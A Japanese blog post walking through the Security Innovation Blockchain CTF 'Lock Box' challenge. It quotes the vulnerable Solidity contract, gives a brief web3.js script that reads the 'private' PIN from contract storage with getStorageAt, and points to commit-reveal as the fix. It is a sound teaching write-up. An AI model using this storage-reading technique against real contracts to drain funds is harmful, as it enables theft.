+++
title = "Security Innovation Blockchain CTF - Lock Box"
date = "2022-05-30"
tags = [
    "security",
    "ctf",
]
+++

#### 概要

[Security Innovation Blockchain CTF](https://blockchain-ctf.securityinnovation.com/)

Security Innovationという企業が開催している、常設のCTFがあります。
今回は、[Lock Box](https://blockchain-ctf.securityinnovation.com/#/game/8)という問題を解きました。

#### 問題

問題を開くと、以下のような画面が出てきます。

ピンを入力してUnlockボタンを押すと、スマートコントラクトが保有している資産を取得できるというアプリのようです。

<img src=./dapps.png><br>

#### ソースコードを読む

constructorではアンロックするためのpinが生成されており、unlock関数で資金を送金するというコードのようです。

unlock関数はpinを受け取り、constructorで生成したpinと同一であれば、資金が送金されるようです。

```solidity
pragma solidity 0.4.24;

import "../CtfFramework.sol";

contract Lockbox1 is CtfFramework{

    uint256 private pin;

    constructor(address _ctfLauncher, address _player) public payable CtfFramework(_ctfLauncher, _player) {
        pin = now%10000;
    }

    function unlock(uint256 _pin) external ctf{
        require(pin == _pin, "Incorrect PIN");
        msg.sender.transfer(address(this).balance);
    }
}
```

#### エクスプロイト

この問題を解くには、`uint256 private pin`として格納されているpinを取得出来る必要があります。
この変数はブロックチェーン上に保存されるものなので、読み取り可能です。

web3.jsを使って書いたエクスプロイトは以下の通りです。
`getStorageAt`という関数を使ってpinを取り出しています。


```solidity
const Web3 = require('web3')
const HDWalletProvider = require("@truffle/hdwallet-provider")

require('dotenv').config()

const web3 = new Web3(new HDWalletProvider(process.env.PRIVATE_KEY, process.env.PROVIDER_URL))
web3.eth.getStorageAt("0x258e6ed1bebd27f05dc466993edd9720ceb3877a", 1).then(storage => console.log(parseInt(storage)))
```

#### どう実装されているべきか

Commit-Revealというパターンを使うことで、ブロックチェーンに機密を保存出来るようです。

- https://karl.tech/learning-solidity-part-2-voting/
- https://medium.com/layerx-jp/smart-contract-design-pattern-34a6401fe743
